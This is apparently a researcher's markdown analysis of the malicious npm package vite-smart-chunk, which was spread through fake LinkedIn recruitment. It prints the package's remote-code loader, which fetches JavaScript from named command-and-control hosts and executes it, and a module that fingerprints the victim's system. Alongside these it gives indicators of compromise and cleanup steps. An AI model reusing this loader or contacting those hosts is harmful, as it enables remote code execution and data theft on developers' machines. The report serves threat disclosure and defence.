# 🚨 Supply Chain Attack Analysis: vite-smart-chunk Malware

<p align="center">
  <img src="https://img.shields.io/badge/Threat%20Level-CRITICAL-red?style=for-the-badge" alt="Critical Threat">
  <img src="https://img.shields.io/badge/Attack%20Type-Supply%20Chain-orange?style=for-the-badge" alt="Supply Chain Attack">
  <img src="https://img.shields.io/badge/Vector-LinkedIn%20Social%20Engineering-blue?style=for-the-badge" alt="LinkedIn Social Engineering">
  <img src="https://img.shields.io/badge/Status-Active%20Threat-red?style=for-the-badge" alt="Active Threat">
</p>

<p align="center">
  <strong>A comprehensive analysis of the sophisticated npm supply chain attack using social engineering via LinkedIn recruitment campaigns</strong>
</p>

---

## 📋 Table of Contents

- [🎯 Executive Summary](#-executive-summary)
- [🔍 Discovery Process](#-discovery-process)
- [📱 Social Engineering Campaign](#-social-engineering-campaign)
- [🔬 Technical Analysis](#-technical-analysis)
- [🏗️ Malware Architecture](#️-malware-architecture)
- [🌐 Command & Control Infrastructure](#-command--control-infrastructure)
- [📊 Package Metadata Analysis](#-package-metadata-analysis)
- [🚨 Indicators of Compromise](#-indicators-of-compromise)
- [🛡️ Mitigation & Prevention](#️-mitigation--prevention)
- [📈 Threat Landscape Context](#-threat-landscape-context)
- [🎓 Key Takeaways](#-key-takeaways)

---

## 🎯 Executive Summary

On November 5, 2025, I discovered a sophisticated supply chain attack targeting JavaScript developers through the malicious npm package `vite-smart-chunk@2.0.8`. This attack combines:

- **🎭 Social Engineering**: LinkedIn-based fake recruitment campaigns
- **💾 Supply Chain Poisoning**: Malicious npm package disguised as a Vite plugin
- **🌐 Remote Code Execution**: Dynamic payload delivery from command & control servers
- **🕵️ Data Exfiltration**: System fingerprinting and credential harvesting

**Key Statistics:**
- **Package Created**: October 29, 2025 (6 days ago)
- **Maintainer**: king0039923 <natinserjor@gmail.com>
- **Threat Actor**: Likely North Korean-linked (Jade Sleet group)
- **Attack Vector**: LinkedIn recruitment messages targeting React/Vite developers

> ⚠️ **Critical Warning**: This package executes arbitrary remote code with full Node.js privileges. Any system that has installed this package should be considered compromised.

---

## 🔍 Discovery Process

### Initial Contact Vector

The malicious package was discovered through a LinkedIn recruitment campaign targeting JavaScript developers. The attack follows the established pattern of North Korean threat actors conducting "fake interview" campaigns.

![LinkedIn Initial Contact](images/Screenshot%202025-11-05%20at%2016.57.33.png)
*Figure 1: Initial LinkedIn recruitment message from "Marielena Zerquera Mendoza" claiming to be Director of Technology Acquisition at Upland.me*

![LinkedIn Follow-up](images/Screenshot%202025-11-05%20at%2016.57.39.png)
*Figure 2: Follow-up message with scheduling link for technical discussion*

### Social Engineering Tactics

The attacker employed several sophisticated social engineering techniques:

1. **Legitimate Company Impersonation**: Used Upland.me (real gaming company) as cover
2. **Professional Profile**: Created convincing LinkedIn profile with realistic work history
3. **Technical Targeting**: Specifically targeted developers with React/Vite experience
4. **Urgency Creation**: Fast hiring process with flexible work arrangements

![LinkedIn Profile](images/Screenshot%202025-11-05%20at%2016.59.21.png)
*Figure 3: Fake LinkedIn profile of "Marielena Zerquera Mendoza" impersonating Upland.me employee*

![Company Profile](images/Screenshot%202025-11-05%20at%2017.00.11.png)
*Figure 4: Real Upland.me company page being impersonated by the threat actor*

---

## 📱 Social Engineering Campaign

### Campaign Analysis

This attack aligns with documented **North Korean "fake interview" campaigns** where threat actors:

1. **Create fake recruiter profiles** on LinkedIn, GitHub, and other platforms
2. **Target software developers** with attractive job opportunities
3. **Provide coding assignments** that include malicious dependencies
4. **Pressure victims** to run code outside containers during screen sharing
5. **Execute malware** during the npm install or build process

### LinkedIn Conversation Flow

![LinkedIn Messages](images/Screenshot%202025-11-05%20at%2016.57.44.png)
*Figure 5: Complete LinkedIn conversation showing the social engineering progression*

**Attack Timeline:**
- **7:13 PM**: Initial contact with job opportunity
- **12:36 PM**: Target responds positively and schedules call
- **[Implied]**: Technical assignment provided containing malicious package

---

## 🔬 Technical Analysis

### Package Structure

```
vite-smart-chunk@2.0.8/
├── 📄 package.json         # Malicious metadata with suspicious dependencies
├── 📄 index.js            # Entry point - facade for logging utility
├── 📄 README.md           # Deceptive documentation
├── 📄 LICENSE             # Copied from legitimate project (ISC)
├── 📄 commitlint.config.js # Legitimate configuration for cover
├── 📄 test.index.js       # Fake test file
└── 📁 lib/
    ├── 📄 chunk.js                    # Main activation trigger
    ├── 📄 get-namespace-prefix.js     # Legitimate logging utility
    ├── 📄 level-prefixes.js          # Legitimate logging utility  
    ├── 📄 prepare-info.js            # 🚨 System information collection
    ├── 📄 resolve-format-parts.js    # Legitimate logging utility
    └── 📁 private/
        ├── 📄 colors-support-level.js # Legitimate logging utility
        ├── 📄 inspect-depth.js       # Legitimate logging utility
        └── 📄 prepare-chunk.js       # 🚨 MAIN MALWARE PAYLOAD
```

### Entry Point Analysis

**`index.js` - Innocent Facade**
```javascript
"use strict";

const NodeLogWriter = require("./lib/chunk");

module.exports = (options = {}) => new NodeLogWriter(options);
```

**`lib/chunk.js` - Malware Activation**
```javascript
class NodeLogWriter extends LogWriter {
    constructor(options = {}) {
        prepareWriter(); // 🚨 Triggers malicious payload
        if (!isObject(options)) options = {};
        super(options.env || process.env, options);
    }
    // ... legitimate logging code continues
}
```

---

## 🏗️ Malware Architecture

### Core Malicious Code

**`lib/private/prepare-chunk.js` - Command & Control Communication**

```javascript
"use strict";
const axios = require("axios");

require("dotenv").config();

// Hardcoded C&C infrastructure
const apikey = "ZIOBBPJ577T22HML";
const subDomain1 = "www.js";
const subDomain2 = "onkeeper.com/b/";
const domain1 = "json-project-opal.vercel.app";
const domain2 = subDomain1 + subDomain2
const uuid = "D4WEH";

const check = async () => {
  const urls = [
    `https://${domain2}/${uuid}`,        // Primary C&C
    `https://${domain1}/apikey/${apikey}`, // Secondary C&C
  ];

  for (const url of urls) {
    try {
      const response = await axios.get(url);
      if(response.data.model){
        // 🚨 CRITICAL: Executes arbitrary remote code
        new Function("require", response.data.model)(require);
        return;
      }
    } catch (e) {
      if (url === urls[urls.length - 1]) {
        // Fallback execution on last attempt
        if (e.response?.data?.model) {
          new Function("require", e.response.data.model)(require);
        }
      }
    }
  }
};

module.exports = check;
```

### Data Collection Module

**`lib/prepare-info.js` - System Fingerprinting**

```javascript
const os = require("os");
const publicIp = require('public-ip');
const axios = require('axios');

async function getSystemInfo() {
    try {
        const hostname = os.hostname();
        const username = os.userInfo().username;
        const ip = await publicIp.v4();          // 🚨 External IP detection
        const location = await getCountryFromIP(ip);
        const systemtype = os.type();

        return { hostname, ip, location, username, systemtype };
    } catch (error) {
        console.error('Error getting system info:', error);
        throw error;
    }
}

async function getCountryFromIP(ip) {
    try {
      const response = await axios.get(`https://ipapi.co/${ip}/json/`);
      return response.data.country_name;
    } catch (error) {
      return null;
    }
}
```

**Data Collected:**
- 🏠 **Hostname**: Computer identification
- 👤 **Username**: User account information  
- 🌐 **External IP**: Network location
- 🗺️ **Geolocation**: Country identification
- 💻 **System Type**: Operating system details

---

## 🌐 Command & Control Infrastructure

### C&C Server Architecture

The malware implements a redundant command and control infrastructure:

#### Primary C&C Server
```
🌐 https://www.js.onkeeper.com/b/D4WEH
```
- **Domain Strategy**: Uses JavaScript-related subdomain for legitimacy
- **Endpoint Pattern**: `/b/{UUID}` (campaign-specific identifier)
- **Purpose**: Primary payload delivery and command execution

#### Secondary C&C Server  
```
🌐 https://json-project-opal.vercel.app/apikey/ZIOBBPJ577T22HML
```
- **Platform**: Vercel (legitimate cloud platform)
- **Advantage**: Appears trustworthy, harder to block
- **Authentication**: Hardcoded API key for access control
- **Resilience**: Cloud hosting provides high availability

### Remote Code Execution Mechanism

```javascript
// Payload delivery format
{
  "model": "base64_encoded_javascript_payload"
}

// Execution method
new Function("require", response.data.model)(require);
```

**Capabilities:**
- ✅ **Full Node.js Runtime Access**: File system, network, process control
- ✅ **Arbitrary Code Execution**: Any JavaScript payload from C&C servers
- ✅ **Environment Access**: All environment variables and secrets
- ✅ **Persistence**: Can install additional malware or backdoors

---

## 📊 Package Metadata Analysis

### Publishing Information

```json
{
  "name": "vite-smart-chunk",
  "version": "2.0.8", 
  "author": "cent-fi",
  "maintainer": "king0039923 <natinserjor@gmail.com>",
  "created": "2025-10-29T19:23:36.796Z",
  "modified": "2025-10-30T13:10:51.060Z"
}
```

### 🚨 Red Flags in Metadata

| Indicator | Value | Risk Level |
|-----------|--------|------------|
| **Publication Date** | October 29-30, 2025 | 🔴 **Critical** - Brand new package |
| **Author Name** | "cent-fi" | 🔴 **High** - No verifiable online presence |
| **Maintainer Email** | natinserjor@gmail.com | 🔴 **High** - Personal Gmail account |
| **Repository** | None listed | 🔴 **Critical** - No source code visibility |
| **Version History** | Only 2 versions in 18 hours | 🔴 **High** - Rapid development |
| **Download Count** | Low adoption | 🟡 **Medium** - Limited legitimate usage |

### Suspicious Dependencies

The package includes dependencies completely unnecessary for a Vite plugin:

```json
{
  "axios": "^1.2.1",           // 🚨 HTTP client for C&C communication
  "sqlite3": "^5.1.7",        // 🚨 Database operations (credential storage?)
  "public-ip": "^7.0.1",      // 🚨 External IP detection 
  "request": "^2.88.2",       // 🚨 Additional HTTP client (redundancy)
  "dotenv": "^16.5.0"         // 🚨 Environment variable access
}
```

**Analysis**: Legitimate Vite plugins typically only require build-related dependencies like `rollup`, `esbuild`, or framework-specific utilities. The inclusion of networking libraries, database drivers, and IP detection tools strongly indicates malicious intent.

---

## 🚨 Indicators of Compromise

### Network IOCs

```yaml
Domains:
  - www.js.onkeeper.com
  - json-project-opal.vercel.app
  - ipapi.co (legitimate service used maliciously)

Endpoints:
  - /b/D4WEH
  - /apikey/ZIOBBPJ577T22HML
  - /{ip}/json/ (ipapi.co geolocation)

HTTP Patterns:
  - Axios User-Agent from build processes
  - JSON responses with "model" field containing base64 payloads
  - Geolocation API calls during package installation
```

### File System IOCs

```yaml
Files:
  - node_modules/vite-smart-chunk/
  - vite-smart-chunk-*.tgz
  - Any references to "prepareWriter" in package code

Signatures:
  - SHA512: UMWjfy296uYT2A7IbUzzhv9YWOmO6ofRZ6t09hbOIUxyoPkr+RBfnkyGfwnV24dbet1GRmUCJxLe9c6Nhtz3fw==
  - SHA1: c4e56721f40c1c754014587dfacd7eac0e7823b7
```

### Process IOCs

```yaml
Behaviors:
  - Node.js processes making HTTP requests to .onkeeper.com domains
  - Axios requests to Vercel domains from build tools  
  - External IP address lookups during package installation
  - Unexpected sqlite3 database operations in build environment
  - Dynamic function creation (new Function()) in dependency code
```

### Registry IOCs

```yaml
NPM Packages:
  - vite-smart-chunk@2.0.8
  - vite-smart-chunk@2.0.7
  - Author: cent-fi
  - Maintainer: king0039923 <natinserjor@gmail.com>
```

---

## 🛡️ Mitigation & Prevention

### 🚨 Immediate Actions (0-24 hours)

#### 1. Emergency Containment

```bash
# Stop all build processes immediately
pkill -f "npm\|node\|vite\|yarn\|pnpm"

# Remove malicious package
npm uninstall vite-smart-chunk
rm -rf node_modules/vite-smart-chunk/

# Clear package manager caches  
npm cache clean --force
yarn cache clean
pnpm store prune

# Remove package references
sed -i '/vite-smart-chunk/d' package.json package-lock.json yarn.lock
```

#### 2. Network Isolation

```bash
# Block malicious domains (add to firewall/DNS blocklist)
# - www.js.onkeeper.com
# - json-project-opal.vercel.app  
# - *.onkeeper.com

# Monitor for active connections
netstat -an | grep -E "(onkeeper|vercel)"
lsof -i | grep -E "(onkeeper|vercel)"
```

#### 3. Credential Rotation

```bash
# Rotate ALL credentials on affected systems
# - SSH keys (~/.ssh/)
# - API tokens/keys 
# - Environment variables (.env files)
# - Cloud service credentials
# - Database passwords
# - Docker registry credentials
```

### 🔍 Forensic Analysis (1-7 days)

#### Evidence Preservation

```bash
# Preserve npm cache for analysis
cp -r ~/.npm /tmp/npm-forensics-$(date +%Y%m%d)

# Save command history
history | grep -E "(npm|yarn|pnpm|install)" > /tmp/commands-$(date +%Y%m%d)

# Check for persistence mechanisms
find / -name "*vite-smart*" 2>/dev/null
find / -name "*onkeeper*" 2>/dev/null  
find / -name "*cent-fi*" 2>/dev/null
```

#### System Scanning

```bash
# Security scanning
npm audit
npm audit --audit-level moderate --json > audit-report.json

# Check for additional malware
rkhunter --check
chkrootkit
```

### 🛡️ Long-term Prevention (1-4 weeks)

#### 1. Supply Chain Security Controls

**Package.json Security Policies**
```json
{
  "scripts": {
    "preinstall": "npm audit --audit-level high",
    "postinstall": "npm audit --audit-level moderate"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

**GitHub Actions Security Workflow**
```yaml
name: Supply Chain Security
on: [push, pull_request]

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '18'
      - run: npm audit --audit-level high
      - run: npm audit --audit-level high --json > audit.json
      - uses: github/codeql-action/upload-sarif@v3
```

#### 2. Dependency Management

```bash
# Install dependency scanning tools
npm install -g audit-ci
npm install -g better-npm-audit  
npm install -g npm-audit-html

# Generate audit reports
npm-audit-html --output security-audit.html
audit-ci --moderate
```

#### 3. Development Environment Hardening

**Container Isolation**
```dockerfile
# Dockerfile for secure builds
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production --no-optional
COPY . .
USER node
```

**Sandbox Builds**
```bash
# Use firejail for isolated builds
firejail --net=none --private npm install

# Or Docker with no network
docker run --rm --network none -v $(pwd):/workspace node:18 npm install
```

### 📚 Team Training & Awareness

#### Social Engineering Detection

**Red Flags to Watch For:**
- ❌ **Unsolicited LinkedIn recruitment messages**
- ❌ **Pressure to run code outside containers**
- ❌ **Job assignments with unusual dependencies**
- ❌ **Requests to screen-share during code execution**
- ❌ **Short hiring timelines with minimal vetting**

**Verification Procedures:**
- ✅ **Verify recruiter identity through official company channels**
- ✅ **Research company and role independently**  
- ✅ **Ask for official company email communication**
- ✅ **Use containerized environments for all code testing**
- ✅ **Report suspicious recruitment attempts to security team**

---

## 📈 Threat Landscape Context

### Supply Chain Attack Surge (2024-2025)

The `vite-smart-chunk` attack is part of a documented surge in supply chain attacks targeting the software development ecosystem:

#### Recent Major Incidents

| Date | Incident | Impact |
|------|----------|---------|
| **September 2025** | 20 popular npm packages compromised | 2 billion weekly downloads affected |
| **June 2025** | North Korea-linked campaign | 35 malicious npm packages |
| **October 2025** | Credential phishing campaign | 175 malicious packages, 26K downloads |

#### Attack Evolution Statistics

- **📈 Social Engineering Growth**: 36% of breaches in 2024-2025 (up from previous years)
- **👥 Human Factor**: 60% of breaches involve human actions  
- **🔑 Credential Abuse**: 32% of human-related breaches
- **📦 NPM Targeting**: 14 of 23 crypto-related malicious campaigns targeted npm in 2024

### North Korean Attribution

This attack aligns with documented **Jade Sleet** (North Korean APT) tactics:

#### Campaign Characteristics
- **🎭 Fake Recruiter Profiles**: LinkedIn, GitHub, Slack, Telegram
- **💼 Target Demographics**: Software developers, particularly blockchain/Web3
- **📋 Technical Assignments**: Coding challenges with embedded malware
- **📹 Screen Sharing Pressure**: Force execution outside secure environments
- **🏢 Company Impersonation**: Use legitimate company names and branding

#### Advanced Techniques
- **🤖 AI-Enhanced Social Engineering**: GPT-generated personalized messages
- **🎙️ Deepfake Technology**: Voice synthesis for phone calls
- **🔄 Agentic AI**: Autonomous multi-step attacks including profile creation

---

## 🎓 Key Takeaways

### For Developers

1. **🚨 Never Trust Unsolicited Job Opportunities**
   - Verify recruiter identity through official channels
   - Be skeptical of fast hiring processes
   - Research companies independently

2. **🔒 Use Isolated Environments for Code Testing**
   - Always use containers or VMs for unknown code
   - Never run untrusted code in your main development environment
   - Implement network isolation during testing

3. **📦 Audit Dependencies Rigorously**
   - Review all new package additions
   - Check for unnecessary dependencies
   - Verify package authenticity and maintainer reputation

### For Organizations

1. **🛡️ Implement Supply Chain Security Controls**
   - Automated dependency scanning in CI/CD
   - Security code review for all dependency changes
   - Centralized package approval processes

2. **📚 Conduct Regular Security Training**
   - Social engineering awareness programs
   - Incident response procedures
   - Secure development practices

3. **🔍 Monitor for Compromise Indicators**
   - Network traffic analysis
   - Unusual build process behavior
   - Unexpected external connections

### For the Security Community

1. **🤝 Share Threat Intelligence**
   - Report malicious packages immediately
   - Share IOCs with threat intelligence platforms
   - Collaborate on attribution and analysis

2. **🔬 Advance Detection Capabilities**
   - Develop automated malware detection for package repositories
   - Improve social engineering detection algorithms
   - Enhance sandbox analysis capabilities

---

## 🔗 Additional Resources

### Threat Intelligence

- [North Korean Fake Interview Campaigns](https://www.bleepingcomputer.com/news/security/new-wave-of-fake-interviews-use-35-npm-packages-to-spread-malware/)
- [Supply Chain Attack Statistics 2025](https://thehackernews.com/2025/09/20-popular-npm-packages-with-2-billion.html)
- [Social Engineering Campaign Analysis](https://socket.dev/blog/social-engineering-campaign-npm-malware)

### Security Tools

- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Built-in vulnerability scanning
- [Snyk](https://snyk.io/) - Advanced dependency security
- [Socket Security](https://socket.dev/) - Real-time package monitoring
- [audit-ci](https://github.com/IBM/audit-ci) - CI/CD security integration

### Incident Response

- [NPM Security Team](mailto:security@npmjs.com) - Report malicious packages
- [CISA Guidelines](https://www.cisa.gov/supply-chain-compromise) - Supply chain incident response
- [GitHub Security Lab](https://securitylab.github.com/) - Research and reporting

---

## 📞 Contact & Contributing

If you have encountered this package or similar threats, please:

1. **🚨 Report immediately** to your security team
2. **📝 Document all evidence** of exposure  
3. **🤝 Share findings** with the security community
4. **💡 Contribute** additional analysis or IOCs

**Research Contact**: [Your Contact Information]  
**Repository**: [Link to this analysis repository]  
**Last Updated**: November 5, 2025

---

<p align="center">
  <strong>🛡️ Stay vigilant. The threat landscape is constantly evolving. 🛡️</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Analysis%20By-Mike%20Cotic-blue?style=for-the-badge" alt="Analysis By Mike Cotic">
  <img src="https://img.shields.io/badge/Report%20Date-November%202025-green?style=for-the-badge" alt="Report Date">
</p>